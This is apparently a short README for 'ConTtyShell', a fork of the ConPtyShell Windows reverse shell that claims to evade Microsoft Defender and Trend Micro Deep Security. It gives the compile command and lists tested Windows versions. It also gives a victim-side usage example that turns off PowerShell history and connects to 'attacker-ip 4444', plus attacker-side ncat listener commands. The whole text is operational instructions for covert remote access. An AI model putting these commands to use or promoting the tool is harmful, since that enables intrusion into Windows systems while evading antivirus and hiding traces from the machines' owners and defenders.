# ConTtyShell
ConPtyShell Fork that Evades:
* Microsoft Defender (as of 14/06/2025)
* Trend Micro Deep Security (as of 03/12/2024)

**Original:**

https://github.com/antonioCoco/ConPtyShell

**Compile with:**

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 -nologo -debug -out:ConTtyShell.exe .\ConTtyShell.cs`

**Tested on:**
* Windows Server 2016 Datacenter 10.0 x64 Build 14393
* Windows Server 2019 x64 Build 1809
* Windows 10 22H2 x64
* Windows 11 22H2 x64


**Victim side usage example:**

```
Set-PSReadlineOption -HistorySaveStyle SaveNothing
.\ConTtyShell.exe attacker-ip 4444
```

**Attacker side usage example:**

```
rlwrap ncat -lvnp 4444

Or

stty raw -echo; (stty size; cat) | ncat -lvnp 6666
```
